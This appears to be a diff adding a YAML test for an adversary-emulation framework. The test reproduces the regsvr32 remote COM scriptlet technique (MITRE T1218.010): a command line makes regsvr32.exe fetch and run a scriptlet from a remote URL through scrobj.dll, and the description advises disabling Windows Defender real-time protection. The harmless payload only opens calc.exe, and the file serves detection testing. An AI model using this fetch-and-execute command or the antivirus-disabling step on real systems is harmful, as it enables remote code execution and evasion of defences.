@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Regsvr32 remote COM scriptlet execution
+description: |
+    Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
+    windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
+args:
+    - name: url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+    - name: regsvr32path
+      type: path
+      default: C:\Windows\system32
+    - name: regsvr32name
+      type: string
+      default: regsvr32.exe
+uuid: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.010: Regsvr32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: regsvr32-remote-com-scriptlet-execution
+      inline: |
+        {{.Args.regsvr32path}}\{{.Args.regsvr32name}} /s /u /i:{{.Args.url}} scrobj.dll
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
